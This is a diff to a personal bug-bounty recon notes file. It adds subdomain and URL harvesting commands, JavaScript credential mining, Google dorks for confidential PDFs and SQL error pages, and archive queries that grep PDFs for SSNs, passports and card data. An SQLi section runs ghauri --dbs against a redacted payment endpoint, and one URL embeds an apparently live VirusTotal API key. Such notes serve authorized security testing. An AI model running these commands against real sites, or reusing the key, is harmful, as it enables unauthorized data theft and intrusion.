@@ -1,3 +1,37 @@
+Recon Methodology
+------------------>
+
+try to get all subdomains
+also try to get there ip address 
+fuzz all subdomains
+also scan with nuclei tempalt
+
+
+
+
+
+mkdir circlelytics
+cd /target
+
+subfinder -d canva.com >> subdomain.txt
+
+//cat subdomain.txt | httpx -sc -td -ip
+
+//duplicut subdomain.txt -o unique_sub.txt
+cat subdomain.txt | anew > unique_sub.txt
+
+httpx -l subdomain.txt -o unique_sub_live.txt
+
+cat unique_sub_live.txt | waybackurls >> urls.txt
+//cat unique_sub_live.txt | getallurls >> urls.txt
+cat unique_sub_live.txt | gau >> urls.txt
+
+//duplicut urls.txt -o unique_urls.txt
+cat urls.txt | anew > unique_urls.txt
+
+
+
+
 recon Tools
 
 1. https://app.pentester.com/
@@ -9,6 +43,41 @@ recon Tools
 6. spiderfoot
 7.https://web.archive.org/cdx/search/cdx?url=*.brex.com/*&output=text&fl=original&collapse=urlkey waybackurls -->
 8. https://sawravchy.github.io/archivefinder/
+
+>> DORKING RECON
+
+
+#things I tried searching
+site:target.com ext:pdf
+site:target.com ext:pdf "CONFIDENTIAL"
+site:target.com ext:pdf "STRICTLY CONFIDENTIAL"
+site:target.com ext:pdf "HIGHLY CONFIDENTIAL"
+site:target.com ext:pdf "PRIVATE"
+site:target.com ext:pdf "PRIVATE AND CONFIDENTIAL"
+site:target.com ext:pdf "PRIVATE AND SENSITIVE"
+
+site:target.com ext:pdf "COMPANY SENSITIVE"
+
+site:target.com "Uncaught Error: Call to undefined function"
+
+site:target.com "error in your SQL"
+
+site:target.com "WordPress database error:"
+
+"PHP Fatal"
+site:*.gov.* "not found in C:\"
+site:*.gov.* "not found in D:\"
+site:*.gov.* "not found in E:\"
+site:*.gov.* "not found in F:\"
+
+site:target.com "Unclosed quotation mark"
+site:target.com "Error Executing Database Query"
+
+site:target.com "mysql_num_rows()" "error"
+site:target.com "mysql_fetch_array()" "error"
+site:target.com "mysql_query()" "error"
+
+site:target.com intext:"sql syntax near" OR intext:"syntax error" OR intext:"unexpected end of SQL" OR intext:"Warning: mysql_" OR intext:"pg_connect()" OR intext:"error in your SQL syntax" OR intext:"OLE DB Provider for SQL Server"
 
 &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
 
@@ -57,7 +126,6 @@ recon Tools
 
 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++=
 
-
 ---------> reconesence###
 
 pentester.com
@@ -68,6 +136,9 @@ shodan.io -->  ssl.cert.subject.cn:audiobooks.com
 click on (open more) than you will found new page where mention more thinh
 
 
+shodan search Ssl.cert.subject.CN:"<REDACTED>" 200 --fields ip_str | httpx-toolkit -sc -title -server -td
+
+
 ------------------------------------------------------------------------------------------------------------------------------------------------
 API KEY 
 
@@ -75,14 +146,52 @@ https://github.com/streaak/keyhacks
 
 
 
+JsRecon methodology By .............
+
+katana -u target.com -d 5 -jc | grep'\.js$' | tee alljs.txt
+echo target.com | gau | '\.js$' | anew alljs.txt
+cat alljs.txt | uro | sort -u | httpx -mc 200 -o target.txt
+
+
+ cat target.txt | xargs -I{} bash -c 'echo -e "\ntarget : {}\n" && python lazyegg.py "{}" --js_urls --domains --ips --leaked_creds --local_storage'
+
+
+waybackurls vulnweb.com | grep '\.js$' | awk -F '?' '{print $1}' | sort -u | xargs -I{} bash -c 'python lazyegg.py "{}" --js_urls --domains --ips' > jsurls.log && cat jsurls.log | grep '\.' | sort -u
 
 
 
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+404 page foud
+--------------->>
 
 
+https://web.archive.org/cdx/search/cdx?url=*.grailed.com/*&collapse=urlkey&output=text&fl=original
 
+https://web.archive.org/cdx/search/cdx?url=*.bugbountyhunter.xyz/*&output=text&fl=original&collapse=urlkey&filter=statuscode:200
+
+https://www.virustotal.com/vtapi/v2/domain/report?apikey=982680b1787fa59701919aa22515a025e00df1e3bb2bc4f186b8e919558d576c&domain=example.com
+
+https://otx.alienvault.com/api/v1/indicators/hostname/domain.com/url_list?limit=500&page=1
+
+curl -G "https://web.archive.org/cdx/search/cdx" --data-urlencode "url=*.sbicard.com/*" --data-urlencode "collapse=urlkey" --data-urlencode "output=text" --data-urlencode "fl=original" > out.txt
+
+curl -L 'https://web.archive.org/cdx/search/cdx?url=redacted.redacted.redacted.com/xxx/x/*&output=text&fl=original&collapse=urlkey&filter=statuscode:200' > output.txt
+
+
+cat out.txt | uro |  grep -E '\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5|\.exe|\.dll|\.bin|\.ini|\.bat|\.sh|\.tar|\.deb|\.rpm|\.iso|\.img|\.apk|\.msi|\.dmg|\.tmp|\.crt|\.pem|\.key|\.pub|\.asc'
+
+
+curl -G "https://web.archive.org/cdx/search/cdx?url=*.example.com/*" --data-urlencode "url=*.example.com/*" --data-urlencode "fl=original" > output.txt
+
+curl "https://web.archive.org/cdx/search/cdx?url=*.policybazaar.com/*&collapse=urlkey&output=text&fl=original&filter=original:.*\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|git|zip|tar|gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yml|gz|config|csv|yaml|md|md5|exe|dll|bin|ini|bat|sh|tar|deb|rpm|iso|img|env|apk|msi|dmg|tmp|crt|pem|key|pub|asc)$" | tee output.txt
+
+cat output.txt | grep -Ea '\.pdf' | while read -r url; do curl -s "$url" | pdftotext - - | grep -Eaiq '(internal use only|confidential|strictly private|personal & confidential|private|restricted|internal|not for distribution|do not share|proprietary|trade secret|classified|sensitive|bank statement|invoice|salary|contract|agreement|non disclosure|passport|social security|ssn|date of birth|credit card|identity|id number|company confidential|staff only|management only|internal only)' && echo "$url"; done
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 TIME base SQL injection methodology 
+-------------------------------------->
 
 Where I look for time based SQLi ?
 Login pages
@@ -90,6 +199,25 @@ Headers
 GET parameters | Sometimes
 Mostly I focus on Login pages and try to check if ORG is using jsp,php or aspx in any domain or not.
 
+SQLi Finding methodology By ..........
+
+
+subfidner -d <REDACTED> -all -silent | httpx-toolkit -sc -td -title -silent | grep -Ei 'asp|php|jsp|jspx|aspx'
+
+echo https://payment.<REDACTED> | gau
+
+ghauri -u 'https://payment.<REDACTED>/instantpay/payment/*' --dbs --batch --level 3 --tech=T
+
+dirsearch -u https://<REDACTED>/ -w payloads/all_attacks.txt -e php,asp,aspx,jsp,py,txt,conf,config,bak,backup,swp,old,db,sqlasp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip -i 200 --full-url
+
+
+shodan search Ssl.cert.subject.CN:"<REDACTED>" 200 --fields ip_str | httpx-toolkit -sc -title -server -td
+
+
+ghauri -r request.txt --dbs --batch --level 3 --tech=t
+
+
+----------------------------------------------------------------------------------------------------------------------------------------------------
 
 
 
